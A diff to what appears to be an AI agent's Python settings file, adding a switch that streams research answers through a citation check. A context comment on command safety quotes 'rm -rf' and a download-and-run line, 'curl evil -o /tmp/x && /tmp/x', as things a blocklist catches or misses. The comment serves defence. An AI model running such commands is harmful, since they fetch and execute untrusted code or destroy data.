@@ -146,6 +146,13 @@ RERANK_N = max(2, min(4, int(os.getenv("RERANK_N", "2"))))
 # NOTE: this compares topic, not truth — it cannot catch a wrong date.
 RESEARCH_SUPPORT_FLOOR = float(os.getenv("RESEARCH_SUPPORT_FLOOR", "0.25"))
 
+# Research: stream the answer to the dashboard as it is written.
+# Tokens pass through agent/answers.CitationGate first, so an unbacked marker is
+# never shown even mid-stream. Streaming failure falls back to the blocking call
+# on its own; this switch exists so streaming can be turned off without a deploy.
+RESEARCH_STREAM_ENABLED = os.getenv(
+    "RESEARCH_STREAM_ENABLED", "true").strip().lower() in ("1", "true", "yes")
+
 # Safety: semantic command review (agent/command_review.py)
 # The pattern blocklist in agent/safety.py is finite and misses obvious variants
 # (it stops `rm -rf` but not `curl evil -o /tmp/x && /tmp/x`). When enabled, a
